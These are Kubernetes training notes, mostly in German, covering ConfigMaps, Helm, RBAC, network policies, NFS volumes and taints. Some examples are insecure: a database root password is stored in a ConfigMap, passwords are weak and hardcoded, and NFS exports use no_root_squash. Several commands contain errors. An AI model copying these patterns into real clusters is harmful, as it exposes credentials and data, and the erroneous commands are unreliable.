  # Add the ConfigMap as a volume to the Pod
  volumes:
    # `name` here must match the name
    # specified in the volume mount
    - name: example-configmap-volume
      # Populate the volume with config map data
      configMap:
        # `name` here must match the name 
        # specified in the ConfigMap's YAML 
        name: example-configmap

  containers:
    - name: container-configmap
      image: nginx:latest
      # Mount the volume that contains the configuration data 
      # into your container filesystem
      volumeMounts:
        # `name` here must match the name
        # from the volumes section of this pod
        - name: example-configmap-volume
          mountPath: /etc/config


```

```
kubectl apply -f 02-pod.yml 
```

```
##Jetzt schauen wir uns den Container/Pod mal an
kubectl exec pod-mit-configmap -- ls -la /etc/config
kubectl exec -it pod-mit-configmap --  bash
## ls -la /etc/config 
```

### Schritt 3: Beispiel. ConfigMap als env-variablen 

```
nano 03-pod-mit-env.yml
```

```
## 03-pod-mit-env.yml 
kind: Pod 
apiVersion: v1 
metadata:
  name: pod-env-var 
spec:
  containers:
    - name: env-var-configmap
      image: nginx:latest 
      envFrom:
        - configMapRef:
            name: example-configmap

```

```
kubectl apply -f 03-pod-mit-env.yml
```

```
## und wir schauen uns das an 
##Jetzt schauen wir uns den Container/Pod mal an
kubectl exec pod-env-var -- env
kubectl exec -it pod-env-var --  bash
## env

```


### Reference: 

 * https://matthewpalmer.net/kubernetes-app-developer/articles/ultimate-configmap-guide-kubernetes.html

### Configmap MariaDB - Example


### Schritt 1: configmap 

```
cd 
mkdir -p manifests
cd manifests
mkdir cftest 
cd cftest 
nano 01-configmap.yml 
```

```
### 01-configmap.yml
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: mariadb-configmap 
data:
  # als Wertepaare
  MARIADB_ROOT_PASSWORD: 11abc432
```

```
kubectl apply -f .
kubectl get cm
kubectl get cm mariadb-configmap -o yaml
```


### Schritt 2: Deployment 
```
nano 02-deploy.yml
```

```
##deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mariadb-deployment
spec:
  selector:
    matchLabels:
      app: mariadb
  replicas: 1 
  template:
    metadata:
      labels:
        app: mariadb
    spec:
      containers:
      - name: mariadb-cont
        image: mariadb:latest
        envFrom:
        - configMapRef:
            name: mariadb-configmap

```

```
kubectl apply -f .
```

### Important Sidenode 

  * If configmap changes, deployment does not know
  * So kubectl apply -f deploy.yml will not have any effect
  * to fix, use stakater/reloader: https://github.com/stakater/Reloader


### Configmap MariaDB my.cnf


### configmap zu fuss 

```
vi mariadb-config2.yml 
```

```
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: example-configmap 
data:
  # als Wertepaare
  database: mongodb
  my.cnf: |
 [mysqld]
 slow_query_log = 1
 innodb_buffer_pool_size = 1G 
  
```

```
kubectl apply -f .
```

```
##deploy.yml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mariadb-deployment
spec:
  selector:
    matchLabels:
      app: mariadb
  replicas: 1
  template:
    metadata:
      labels:
        app: mariadb
    spec:
      containers:
      - name: mariadb-cont
        image: mariadb:latest
        envFrom:
        - configMapRef:
            name: mariadb-configmap

        volumeMounts:
          - name: example-configmap-volume
            mountPath: /etc/my

      volumes:
      - name: example-configmap-volume
        configMap:
          name: example-configmap
```

```
kubectl apply -f .
```

## Helm (Kubernetes Paketmanager) 

### Helm Grundlagen


### Wo ? 

```
artifacts helm 

```

 * https://artifacthub.io/

### Komponenten 

```
Chart - beeinhaltet Beschreibung und Komponenten 
tar.gz - Format 
oder Verzeichnis 

Wenn wir ein Chart ausführen wird eine Release erstellen 
(parallel: image -> container, analog: chart -> release)
```

### Installation 

```
## Beispiel ubuntu 
## snap install --classic helm

## Cluster muss vorhanden, aber nicht notwendig wo helm installiert 

## Voraussetzung auf dem Client-Rechner (helm ist nichts als anderes als ein Client-Programm) 
Ein lauffähiges kubectl auf dem lokalen System (welches sich mit dem Cluster verbinden kann).
-> saubere -> .kube/config 

## Test
kubectl cluster-info 

```


### Helm Warum ?


```
Ein Paket für alle Komponenten
Einfaches Installieren, Updaten und deinstallieren 
Feststehende Struktur 
```

### Helm Example


### Prerequisites 

  * kubectl needs to be installed and configured to access cluster
  * Good: helm works as unprivileged user as well - Good for our setup 
  * install helm on ubuntu (client) as root: snap install --classic helm 
    * this installs helm3
  * Please only use: helm3. No server-side components needed (in cluster) 
    * Get away from examples using helm2 (hint: helm init) - uses tiller  

### Simple Walkthrough (Example 0)

```
## Repo hinzufpgen 
helm repo add bitnami https://charts.bitnami.com/bitnami 
## gecachte Informationen aktualieren 
helm repo update

helm search repo bitnami 
## helm install release-name bitnami/mysql
helm install my-mysql bitnami/mysql
## Chart runterziehen ohne installieren 
## helm pull bitnami/mysql

## Release anzeigen zu lassen
helm list 

## Status einer Release / Achtung, heisst nicht unbedingt nicht, dass pod läuft 
helm status my-mysql 

## weitere release installieren 
## helm install neuer-release-name  bitnami/mysql 


```

### Under the hood 

```
## Helm speichert Informationen über die Releases in den Secrets
kubectl get secrets | grep helm 


```


### Example 1: - To get know the structure 

```
helm repo add bitnami https://charts.bitnami.com/bitnami 
helm search repo bitnami 
helm repo update
helm pull bitnami/mysql 
tar xzvf mysql-9.0.0.tgz 

```



### Example 2: We will setup mysql without persistent storage (not helpful in production ;o() 

```
helm repo add bitnami https://charts.bitnami.com/bitnami 
helm search repo bitnami 
helm repo update

helm install my-mysql bitnami/mysql


```


### Example 2 - continue - fehlerbehebung 

```
helm uninstall my-mysql 
## Install with persistentStorage disabled - Setting a specific value 
helm install my-mysql --set primary.persistence.enabled=false bitnami/mysql

## just as notice 
## helm uninstall my-mysql 

```

### Example 2b: using a values file 

```
## mkdir helm-mysql
## cd helm-mysql
## vi values.yml 
primary:
  persistence:
    enabled: false 
```

```
helm uninstall my-mysql
helm install my-mysql bitnami/mysql -f values.yml 
```

### Example 3: Install wordpress 

```
helm repo add bitnami https://charts.bitnami.com/bitnami 
helm install my-wordpress \
  --set wordpressUsername=admin \
  --set wordpressPassword=password \
  --set mariadb.auth.rootPassword=secretpassword \
    bitnami/wordpress
```

### Example 4: Install Wordpress with values and auth 

```

## mkdir helm-mysql
## cd helm-mysql
## vi values.yml
persistence:
  enabled: false



wordpressUsername: admin
wordpressPassword: password
mariadb:
  primary:
    persistence:
      enabled: false

  auth:
    rootPassword: secretpassword


```

```
helm uninstall my-wordpress 
helm install my-wordpress bitnami/wordpress -f values 
```

### Referenced

  * https://github.com/bitnami/charts/tree/master/bitnami/mysql/#installing-the-chart
  * https://helm.sh/docs/intro/quickstart/

## Kubernetes - RBAC 

### Nutzer einrichten microk8s ab kubernetes 1.25


### Enable RBAC in microk8s 

```
## This is important, if not enable every user on the system is allowed to do everything 
microk8s enable rbac 
```

### Schritt 1: Nutzer-Account auf Server anlegen und secret anlegen / in Client 

```
cd 
mkdir -p manifests/rbac
cd manifests/rbac
```

####  Mini-Schritt 1: Definition für Nutzer 

```
## vi service-account.yml 
apiVersion: v1
kind: ServiceAccount
metadata:
  name: training
  namespace: default
```

```
kubectl apply -f service-account.yml 
```

#### Mini-Schritt 1.5: Secret erstellen 

  * From Kubernetes 1.25 tokens are not created automatically when creating a service account (sa)
  * You have to create them manually with annotation attached 
  * https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#create-token

```
## vi secret.yml 
apiVersion: v1
kind: Secret
type: kubernetes.io/service-account-token
metadata:
  name: trainingtoken
  annotations:
    kubernetes.io/service-account.name: training
```

```
kubectl apply -f .
```


#### Mini-Schritt 2: ClusterRolle festlegen - Dies gilt für alle namespaces, muss aber noch zugewiesen werden

```
### Bevor sie zugewiesen ist, funktioniert sie nicht - da sie keinem Nutzer zugewiesen ist 

## vi pods-clusterrole.yml 
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pods-clusterrole
rules:
- apiGroups: [""] # "" indicates the core API group
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
```

```
kubectl apply -f pods-clusterrole.yml 
```

#### Mini-Schritt 3: Die ClusterRolle den entsprechenden Nutzern über RoleBinding zu ordnen 
```
## vi rb-training-ns-default-pods.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rolebinding-ns-default-pods
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pods-clusterrole 
subjects:
- kind: ServiceAccount
  name: training
  namespace: default
```

```
kubectl apply -f rb-training-ns-default-pods.yml
```

#### Mini-Schritt 4: Testen (klappt der Zugang) 

```
kubectl auth can-i get pods -n default --as system:serviceaccount:default:training
```

### Schritt 2: Context anlegen / Credentials auslesen und in kubeconfig hinterlegen (bis Version 1.25.) 

#### Mini-Schritt 1: kubeconfig setzen 

```
kubectl config set-context training-ctx --cluster microk8s-cluster --user training

## extract name of the token from here 

TOKEN=`kubectl get secret trainingtoken -o jsonpath='{.data.token}' | base64 --decode`
echo $TOKEN
kubectl config set-credentials training --token=$TOKEN
kubectl config use-context training-ctx

## Hier reichen die Rechte nicht aus 
kubectl get deploy
## Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:kube-system:training" cannot list # resource "pods" in API group "" in the namespace "default"
```

#### Mini-Schritt 2:
```
kubectl config use-context training-ctx
kubectl get pods 
```

#### Mini-Schritt 3: Zurück zum alten Default-Context 

```
kubectl config get-contexts
```

```
CURRENT   NAME           CLUSTER            AUTHINFO    NAMESPACE
          microk8s       microk8s-cluster   admin2
*         training-ctx   microk8s-cluster   training2
```

```
kubectl config use-context microk8s  
```


### Refs:

  * https://docs.oracle.com/en-us/iaas/Content/ContEng/Tasks/contengaddingserviceaccttoken.htm
  * https://microk8s.io/docs/multi-user
  * https://faun.pub/kubernetes-rbac-use-one-role-in-multiple-namespaces-d1d08bb08286

### Ref: Create Service Account Token 

  * https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#create-token

## Kubernetes - Netzwerk (CNI's) / Mesh

### Netzwerk Interna


### Network Namespace for each pod 

#### Overview 

![Overview](https://www.inovex.de/wp-content/uploads/2020/05/Container-to-Container-Networking_2_neu-400x401.png)
![Overview Kubernetes Networking](https://www.inovex.de/wp-content/uploads/2020/05/Container-to-Container-Networking_3_neu-400x412.png)

#### General 

  * Each pod will have its own network namespace
    * with routing, networkdevices 
  * Connection to default namespace to host is done through veth - Link to bridge on host network 
    * similar like on docker to docker0 
  
```
  Each container is connected to the bridge via a veth-pair. This interface pair functions like a virtual point-to-point ethernet connection and connects the network namespaces of the containers with the network namespace of the host
```
  
  * Every container is in the same Network Namespace, so they can communicate through localhost
    * Example with hashicorp/http-echo container 1 and busybox container 2 ? 
 
 
### Pod-To-Pod Communication (across nodes)  
 
#### Prerequisites 
 
  * pods on a single node as well as pods on a topological remote can establish communication at all times
   * Each pod receives a unique IP address, valid anywhere in the cluster. Kubernetes requires this address to not be subject to network address   translation (NAT)
   * Pods on the same node through virtual bridge (see image above)
 
#### General (what needs to be done) - and could be doen manually
 
   * local bridge networks of all nodes need to be connected
   * there needs to be an IPAM (IP-Address Managemenet) so addresses are only used once
   * The need to be routes so, that each bridge can communicate with the bridge on the other network
   * Plus: There needs to be a rule for incoming network
   * Also: A tunnel needs to be set up to the outside world.

#### General - Pod-to-Pod Communiation (across nodes) - what would need to be done

![pod to pod across nodes](https://www.inovex.de/wp-content/uploads/2020/05/Pod-to-Pod-Networking.png)


#### General - Pod-to-Pod Communication (side-note) 

  * This could of cause be done manually, but it is too complex 
  * So Kubernetes has created an Interface, which is well defined 
    * The interface is called CNI (common network interface) 
    * Funtionally is achieved through Network Plugin (which use this interface) 
      * e.g. calico / cilium / weave net / flannel 


#### CNI 

  * CNI only handles network connectivity of container and the cleanup of allocated resources (i.e. IP addresses) after containers have been deleted (garbage collection) and therefore is lightweight and quite easy to implement. 
  * There are some basic libraries within CNI which do some basic stuff.
 
   
    


### Hidden Pause Container 

#### What is for ? 

  * Holds the network - namespace for the pod 
  * Gets started first and falls asleep later 
  * Will still be there, when the other containers die 

```
cd 
mkdir -p manifests 
cd manifests 
mkdir pausetest
cd pausetest
nano 01-nginx.yml
```

```
## vi nginx-static.yml 

apiVersion: v1
kind: Pod
metadata:
  name: nginx-pausetest
  labels:
    webserver: nginx:1.21
spec:
  containers:
  - name: web
    image: nginx
```

```
kubectl apply -f .

ctr -n k8s.io c list | grep pause
```


### References 

  * https://www.inovex.de/de/blog/kubernetes-networking-part-1-en/
  * https://www.inovex.de/de/blog/kubernetes-networking-2-calico-cilium-weavenet/

### Übersicht Netzwerke


### CNI 

  * Common Network Interface
  * Feste Definition, wie Container mit Netzwerk-Bibliotheken kommunizieren

### Docker - Container oder andere 

  * Container wird hochgefahren -> über CNI -> zieht Netzwerk - IP  hoch. 
  * Container witd runtergahren -> uber CNI -> Netzwerk - IP wird released 

### Welche gibt es ? 

  * Flanel
  * Canal 
  * Calico 
  * Cilium
  * Weave Net 
  
### Flannel

#### Overlay - Netzwerk 

  * virtuelles Netzwerk was sich oben drüber und eigentlich auf Netzwerkebene nicht existiert
  * VXLAN 

#### Vorteile 

  * Guter einfacher Einstieg 
  * redziert auf eine Binary flanneld 

#### Nachteile 

  * keine Firewall - Policies möglich 
  * keine klassichen Netzwerk-Tools zum Debuggen möglich. 

### Canal 

#### General 

  * Auch ein Overlay - Netzwerk 
  * Unterstüzt auch policies 

### Calico

#### Generell 

  * klassische Netzwerk (BGP)

#### Vorteile gegenüber Flannel 

  * Policy über Kubernetes Object (NetworkPolicies)

#### Vorteile 

  * ISTIO integrierbar (Mesh - Netz) 
  * Performance etwas besser als Flannel (weil keine Encapsulation)

#### Referenz 
  * https://projectcalico.docs.tigera.io/security/calico-network-policy

### Weave Net 

  * Ähnlich calico 
  * Verwendet overlay netzwerk
  * Sehr stabil bzgl IPV4/IPV6 (Dual Stack) 
  * Sehr grosses Feature-Set 
  * mit das älteste Plugin 


### microk8s Vergleich 

  * https://microk8s.io/compare

```
snap.microk8s.daemon-flanneld
Flannel is a CNI which gives a subnet to each host for use with container runtimes.

Flanneld runs if ha-cluster is not enabled. If ha-cluster is enabled, calico is run instead.

The flannel daemon is started using the arguments in ${SNAP_DATA}/args/flanneld. For more information on the configuration, see the flannel documentation.
```

### Calico - nginx example NetworkPolicy


```
## Schritt 1:
kubectl create ns policy-demo
kubectl create deployment --namespace=policy-demo nginx --image=nginx
kubectl expose --namespace=policy-demo deployment nginx:1.21 --port=80
## lassen einen 2. pod laufen mit dem auf den nginx zugreifen 
kubectl run --namespace=policy-demo access --rm -ti --image busybox
```
```
## innerhalb der shell 
wget -q nginx -O -
```
```
## Schritt 2: Policy festlegen, dass kein Ingress-Traffic erlaubt
## in diesem namespace: policy-demo 
kubectl create -f - <<EOF
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: default-deny
  namespace: policy-demo
spec:
  podSelector:
    matchLabels: {}
EOF
## lassen einen 2. pod laufen mit dem auf den nginx zugreifen 
kubectl run --namespace=policy-demo access --rm -ti --image busybox
```

```
## innerhalb der shell 
wget -q nginx -O -
```

```
## Schritt 3: Zugriff erlauben von pods mit dem Label run=access 
kubectl create -f - <<EOF
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: access-nginx
  namespace: policy-demo
spec:
  podSelector:
    matchLabels:
      app: nginx
  ingress:
    - from:
      - podSelector:
          matchLabels:
            run: access
EOF

## lassen einen 2. pod laufen mit dem auf den nginx zugreifen 
## pod hat durch run -> access automatisch das label run:access zugewiesen 
kubectl run --namespace=policy-demo access --rm -ti --image busybox
```

```
## innerhalb der shell 
wget -q nginx -O -
```

``` 
kubectl run --namespace=policy-demo no-access --rm -ti --image busybox
```

```
## in der shell  
wget -q nginx -O -
```

```

kubectl delete ns policy-demo 

```


### Ref:

  * https://projectcalico.docs.tigera.io/security/tutorials/kubernetes-policy-basic

### Beispiele Ingress Egress NetworkPolicy


### Links 

  * https://github.com/ahmetb/kubernetes-network-policy-recipes
  * https://k8s-examples.container-solutions.com/examples/NetworkPolicy/NetworkPolicy.html

### Example with http (Cilium !!) 

```
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
description: "L7 policy to restrict access to specific HTTP call"
metadata:
  name: "rule1"
spec:
  endpointSelector:
    matchLabels:
      type: l7-test
  ingress:
  - fromEndpoints:
    - matchLabels:
        org: client-pod
    toPorts:
    - ports:
      - port: "8080"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/discount"
```          
   
### Downside egress 

  * No valid api for anything other than IP's and/or Ports
  * If you want more, you have to use CNI-Plugin specific, e.g. 

#### Example egress with ip's 

```
## Allow traffic of all pods having the label role:app
## egress only to a specific ip and port 
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: test-network-policy
  namespace: default
spec:
  podSelector:
    matchLabels:
      role: app
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 10.10.0.0/16
    ports:
    - protocol: TCP 
      port: 5432
```

### Example Advanced Egress (cni-plugin specific) 

#### Cilium

```
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: "fqdn-pprof"
  namespace: msp
spec:
  endpointSelector:
    matchLabels:
      app: pprof
  egress:
  - toFQDNs:
    - matchPattern: '*.baidu.com'
  - toPorts:
    - ports:
      - port: "53"
        protocol: ANY
      rules:
        dns:
        - matchPattern: '*'
```

#### Calico 

  * Only Calico enterprise 
    * Calico Enterprise extends Calico’s policy model so that domain names (FQDN / DNS) can be used to allow access from a pod or set of pods (via label selector) to external resources outside of your cluster.
    * https://projectcalico.docs.tigera.io/security/calico-enterprise/egress-access-controls

#### Using isitio as mesh (e.g. with cilium/calico )

##### Installation of sidecar in calico 

  * https://projectcalico.docs.tigera.io/getting-started/kubernetes/hardway/istio-integration

##### Example 

```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: test-network-policy
  namespace: default
spec:
  podSelector:
    matchLabels:
      role: app
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 10.10.0.0/16
    ports:
    - protocol: TCP 
      port: 5432
```

### Mesh / istio


### Schaubild 

![istio Schaubild](https://istio.io/latest/docs/examples/virtual-machines/vm-bookinfo.svg)

### Istio 

```
## Visualization 
## with kiali (included in istio) 
https://istio.io/latest/docs/tasks/observability/kiali/kiali-graph.png

## Example 
## https://istio.io/latest/docs/examples/bookinfo/
The sidecars are injected in all pods within the namespace by labeling the namespace like so:
kubectl label namespace default istio-injection=enabled

## Gateway (like Ingress in vanilla Kubernetes) 
kubectl label namespace default istio-injection=enabled
```

### istio tls 

 * https://istio.io/latest/docs/ops/configuration/traffic-management/tls-configuration/


### istio - the next generation without sidecar 

  * https://istio.io/latest/blog/2022/introducing-ambient-mesh/

### Kubernetes Ports/Protokolle

  * https://kubernetes.io/docs/reference/networking/ports-and-protocols/

### IPV4/IPV6 Dualstack

  * https://kubernetes.io/docs/concepts/services-networking/dual-stack/

## kubectl 

### Start pod (container with run && examples)


### Beispiel 1 (das funktioniert)

```
## Zeigt mir die Pods die laufen
kubectl get pods 

## Aufbau des Befehls  
## kubectl run NAME --image=IMAGE_EG_FROM_DOCKER

## Ein Beispiel
kubectl run nginx --image=nginx:1.25.1

kubectl get pods 
## Alle nodes anzeigen
kubectl get nodes -o wide 
## Auf welchem Node läuft der Pods
kubectl get pods -o wide 
```

### Beispiel 2 (das nicht funktioniert !!)

```
kubectl run sonnenschein --image=foo2
## Ergebnis-> pod/sonnenschein created
## ABER: 
## ImageErrPull - Image konnte nicht geladen werden  => bedeutet pod läuft nicht, obwohl nicht 
kubectl get pods 
## Weitere status - info 
kubectl describe pods sonnenschein
```

### Beide Pods wieder löschen

```
kubectl delete pods nginx foo2 
kubectl get pods
```

### Referenz:

  * https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#run

### Bash completion for kubectl


### Walkthrough 

```
## Eventuell, wenn bash-completion nicht installiert ist.
apt install bash-completion
source /usr/share/bash-completion/bash_completion
## is it installed properly 
type _init_completion
```

```
## activate for all users 
kubectl completion bash | sudo tee /etc/bash_completion.d/kubectl > /dev/null

## verifizieren - neue login shell
su -

## zum Testen
kubectl g<TAB> 
kubectl get 
```
### Alternative für k als alias für kubectl 

```
source <(kubectl completion bash)
complete -F __start_kubectl k

```

### Reference 

  * https://kubernetes.io/docs/tasks/tools/included/optional-kubectl-configs-bash-linux/

### kubectl Spickzettel


### Allgemein 

```
## Zeige Information über das Cluster 
kubectl cluster-info 

## Welche api-resources gibt es ?
kubectl api-resources 

## Hilfe zu object und eigenschaften bekommen
kubectl explain pod 
kubectl explain pod.metadata
kubectl explain pod.metadata.name 

```

### Arbeiten mit manifesten 

```
kubectl apply -f nginx-replicaset.yml 
## Wie ist aktuell die hinterlegte config im system
kubectl get -o yaml -f nginx-replicaset.yml 

## Änderung in nginx-replicaset.yml z.B. replicas: 4 
## dry-run - was wird geändert 
kubectl diff -f nginx-replicaset.yml 

## anwenden 
kubectl apply -f nginx-replicaset.yml 

## Alle Objekte aus manifest löschen
kubectl delete -f nginx-replicaset.yml 


```

### Ausgabeformate 

```
## Ausgabe kann in verschiedenen Formaten erfolgen 
kubectl get pods -o wide # weitere informationen 
## im json format
kubectl get pods -o json 

## gilt natürluch auch für andere kommandos
kubectl get deploy -o json 
kubectl get deploy -o yaml 
```



### Zu den Pods 

```
## Start einen pod // BESSER: direkt manifest verwenden
## kubectl run podname image=imagename 
kubectl run nginx image=nginx 

## Pods anzeigen 
kubectl get pods 
kubectl get pod
## Format weitere Information 
kubectl get pod -o wide 
## Zeige labels der Pods
kubectl get pods --show-labels 

## Zeige pods mit einem bestimmten label 
kubectl get pods -l app=nginx 

## Status eines Pods anzeigen 
kubectl describe pod nginx 

## Pod löschen 
kubectl delete pod nginx 

## Kommando in pod ausführen 
kubectl exec -it nginx -- bash 

```

### Arbeiten mit namespaces 

```
## Welche namespaces auf dem System 
kubectl get ns 
kubectl get namespaces 
## Standardmäßig wird immer der default namespace verwendet 
## wenn man kommandos aufruft 
kubectl get deployments 

## Möchte ich z.B. deployment vom kube-system (installation) aufrufen, 
## kann ich den namespace angeben
kubectl get deployments --namespace=kube-system 
kubectl get deployments -n kube-system 

## wir wollen unseren default namespace ändern 
kubectl config set-context --current --namespace <dein-namespace>
```



### Referenz

  * https://kubernetes.io/de/docs/reference/kubectl/cheatsheet/

### Tipps&Tricks zu Deploymnent - Rollout


### Warum 

```
Rückgängig machen von deploys, Deploys neu unstossen.
(Das sind die wichtigsten Fähigkeiten

```

### Beispiele 

```
## Deployment nochmal durchführen 
## z.B. nach kubectl uncordon n12.training.local 
kubectl rollout restart deploy nginx-deployment 

## Rollout rückgängig machen 
kubectl rollout undo deploy nginx-deployment 

```

## Kubernetes - Shared Volumes 

### Shared Volumes with nfs


### Create new server and install nfs-server

```
## on Ubuntu 20.04LTS
apt install nfs-kernel-server 
systemctl status nfs-server 

vi /etc/exports 
## adjust ip's of kubernetes master and nodes 
## kmaster
/var/nfs/ 192.168.56.101(rw,sync,no_root_squash,no_subtree_check)
## knode1
/var/nfs/ 192.168.56.103(rw,sync,no_root_squash,no_subtree_check)
## knode 2
/var/nfs/ 192.168.56.105(rw,sync,no_root_squash,no_subtree_check)

exportfs -av 
```

### On all nodes (needed for production) 

```
## 
apt install nfs-common 

```

### On all nodes (only for testing)

```
#### Please do this on all servers (if you have access by ssh)
### find out, if connection to nfs works ! 

## for testing 
mkdir /mnt/nfs 
## 10.135.0.18 is our nfs-server 
mount -t nfs 10.135.0.18:/var/nfs /mnt/nfs 
ls -la /mnt/nfs
umount /mnt/nfs
```

### Persistent Storage-Step 1: Setup PersistentVolume in cluster

```
cd
cd manifests 
mkdir -p nfs 
cd nfs 
nano 01-pv.yml 
```

```
apiVersion: v1
kind: PersistentVolume
metadata:
  # any PV name
  name: pv-nfs-tln<nr>
  labels:
    volume: nfs-data-volume-tln<nr>
spec:
  capacity:
    # storage size
    storage: 1Gi
  accessModes:
    # ReadWriteMany(RW from multi nodes), ReadWriteOnce(RW from a node), ReadOnlyMany(R from multi nodes)
    - ReadWriteMany
  persistentVolumeReclaimPolicy:
    # retain even if pods terminate
    Retain
  nfs:
    # NFS server's definition
    path: /var/nfs/tln<nr>/nginx
    server: 10.135.0.18
    readOnly: false
  storageClassName: ""
```

```
kubectl apply -f 01-pv.yml 
kubectl get pv 
```

### Persistent Storage-Step 2: Create Persistent Volume Claim 

```
nano 02-pvc.yml
```

```
## vi 02-pvc.yml 
## now we want to claim space
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: pv-nfs-claim-tln<nr>
spec:
  storageClassName: ""
  volumeName: pv-nfs-tln<nr>
  accessModes:
  - ReadWriteMany
  resources:
     requests:
       storage: 1Gi
```


```
kubectl apply -f 02-pvc.yml
kubectl get pvc
```

### Persistent Storage-Step 3: Deployment 

```
## deployment including mount 
## vi 03-deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 4 # tells deployment to run 4 pods matching the template
  template:
    metadata:
      labels:
        app: nginx
    spec:
       
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
        
        volumeMounts:
          - name: nfsvol
            mountPath: "/usr/share/nginx/html"

      volumes:
      - name: nfsvol
        persistentVolumeClaim:
          claimName: pv-nfs-claim-tln<tln>


```

```
kubectl apply -f 03-deploy.yml 

```

### Persistent Storage Step 4: service 

```
## now testing it with a service 
## cat 04-service.yml 
apiVersion: v1
kind: Service
metadata:
  name: service-nginx
  labels:
    run: svc-my-nginx
spec:
  type: NodePort
  ports:
  - port: 80
    protocol: TCP
  selector:
    app: nginx
```        

```
kubectl apply -f 04-service.yml 
```

### Persistent Storage Step 5: write data and test

```
## connect to the container and add index.html - data 
kubectl exec -it deploy/nginx-deployment -- bash 
## in container
echo "hello dear friend" > /usr/share/nginx/html/index.html 
exit 

## now try to connect 
kubectl get svc 

## connect with ip and port
kubectl run -it --rm curly --image=curlimages/curl -- /bin/sh 
## curl http://<cluster-ip>
## exit

## now destroy deployment 
kubectl delete -f 03-deploy.yml 

## Try again - no connection 
kubectl run -it --rm curly --image=curlimages/curl -- /bin/sh 
## curl http://<cluster-ip>
## exit 
```

### Persistent Storage Step 6: retest after redeployment 

```
## now start deployment again 
kubectl apply -f 03-deploy.yml 

## and try connection again  
kubectl run -it --rm curly --image=curlimages/curl -- /bin/sh 
## curl http://<cluster-ip>
## exit 
```




## Kubernetes - Tipps & Tricks 

### Kubernetes Debuggen ClusterIP/PodIP


### Situation 

  * Kein Zugriff auf die Nodes, zum Testen von Verbindungen zu Pods und Services über die PodIP/ClusterIP 

### Lösung 

```
## Wir starten eine Busybox und fragen per wget und port ab
## busytester ist der name 
## long version 
kubectl run -it --rm --image=busybox busytester 
## wget <pod-ip-des-ziels> 
## exit 


## quick and dirty 
kubectl run -it --rm --image=busybox busytester -- wget <pod-ip-des-ziels>  

```

### Debugging pods


### How ?

  1. Which pod is in charge 
  1. Problems when starting: kubectl describe po mypod 
  1. Problems while running: kubectl logs mypod 

### Taints und Tolerations


### Taints 

```
Taints schliessen auf einer Node alle Pods aus, die nicht bestimmte taints haben:

Möglichkeiten:

o Sie werden nicht gescheduled - NoSchedule 
o Sie werden nicht executed - NoExecute 
o Sie werden möglichst nicht gescheduled. - PreferNoSchedule 

```

### Tolerations 

```
Tolerations werden auf Pod-Ebene vergeben: 
tolerations: 

Ein Pod kann (wenn es auf einem Node taints gibt), nur 
gescheduled bzw. ausgeführt werden, wenn er die 
Labels hat, die auch als
Taints auf dem Node vergeben sind.
```

### Walkthrough  

#### Step 1: Cordon the other nodes - scheduling will not be possible there 

```
## Cordon nodes n11 and n111 
## You will see a taint here 
kubectl cordon n11
kubectl cordon n111
kubectl describe n111 | grep -i taint 
```



### Step 2: Set taint on first node 

```
kubectl taint nodes n1 gpu=true:NoSchedule
```

### Step 3

```
cd 
mkdir -p manifests
cd manifests 
mkdir tainttest 
cd tainttest 
nano 01-no-tolerations.yml
```

```
##vi 01-no-tolerations.yml 
apiVersion: v1
kind: Pod
metadata:
  name: nginx-test-no-tol
  labels:
    env: test-env
spec:
  containers:
  - name: nginx
    image: nginx:1.21
```

```
kubectl apply -f . 
kubectl get po nginx-test-no-tol
kubectl get describe nginx-test-no-tol
```

### Step 4:

```
## vi 02-nginx-test-wrong-tol.yml 
apiVersion: v1
kind: Pod
metadata:
  name: nginx-test-wrong-tol
  labels:
    env: test-env
spec:
  containers:
  - name: nginx
    image: nginx:latest
  tolerations:
  - key: "cpu"
    operator: "Equal"
    value: "true"
    effect: "NoSchedule"
```

```
kubectl apply -f .
kubectl get po nginx-test-wrong-tol
kubectl describe po nginx-test-wrong-tol
```

### Step 5:

```
## vi 03-good-tolerations.yml 
apiVersion: v1
kind: Pod
metadata:
  name: nginx-test-good-tol
  labels:
    env: test-env
spec:
  containers:
  - name: nginx
    image: nginx:latest
  tolerations:
  - key: "gpu"
    operator: "Equal"
    value: "true"
    effect: "NoSchedule"
```

```
kubectl apply -f .
kubectl get po nginx-test-good-tol
kubectl describe po nginx-test-good-tol
```

#### Taints rausnehmen 

```
kubectl taint nodes n1 gpu:true:NoSchedule-
```

#### uncordon other nodes 

```
kubectl uncordon n11
kubectl uncordon n111
```

### References 
  
  * [Doku Kubernetes Taints and Tolerations](https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/)
  * https://blog.kubecost.com/blog/kubernetes-taints/

### Autoscaling Pods/Deployments


### Example: newest version with autoscaling/v2 used to be hpa/v1

```
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hello
spec:
  replicas: 3
  selector:
    matchLabels:
      app: hello
  template:
    metadata:
      labels:
        app: hello
    spec:
      containers:
      - name: hello
        image: k8s.gcr.io/hpa-example
        resources:
          requests:
            cpu: 100m
---
kind: Service
